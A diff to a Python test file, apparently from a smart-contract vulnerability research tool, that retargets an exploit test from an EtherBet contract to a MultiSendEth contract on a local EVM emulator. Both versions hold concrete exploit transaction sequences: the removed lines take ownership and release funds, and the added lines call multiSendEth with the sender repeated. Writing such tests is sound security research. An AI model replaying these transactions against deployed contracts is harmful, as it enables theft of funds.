@@ -63,7 +63,7 @@ def test_vulnerability(datadir):
     print(report)
 
 def test_exploit(datadir):
-    filename = "0x3C3F481950FA627bb9f39A04bCCdc88f4130795b#EtherBet.sol"
+    filename = "0x8c2ee56d97c010714c11a48d7a745a641eb4d1f9#MultiSendEth.sol"
     name = filename.split('.')[0].split('#')[1]
     filename = os.path.join(datadir, filename)
     evm = EvmHandler()
@@ -77,9 +77,9 @@ def test_exploit(datadir):
     accounts = evm.getAccounts()
     account = list(accounts.keys())[0]
     balance = accounts[account]
-    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["own(address)"] + eth_abi.encode_abi(["address"], [account]).hex())
+    trace = evm.sendTx(account, address, "100", "")
     print("trace:", [t["op"] for t in trace])
-    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["releaseFunds(uint256)"] + eth_abi.encode_abi(["uint256"], [100]).hex())
+    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["multiSendEth(uint256,address[])"] + eth_abi.encode_abi(["uint256", "address[]"], [100, [account, account]]).hex())
     print("trace:", [t["op"] for t in trace])
     accounts = evm.getAccounts()
     balance_1 = accounts[account]
@@ -88,5 +88,5 @@ def test_exploit(datadir):
 if __name__ == "__main__":
     # test()
     # test_compile("/home/zqz/teether_contract")
-    # test_exploit("/home/zqz/teether_contract")
-    test_vulnerability("/home/zqz/contracts")
+    test_exploit("/home/zqz/teether_contract")
+    # test_vulnerability("/home/zqz/contracts")
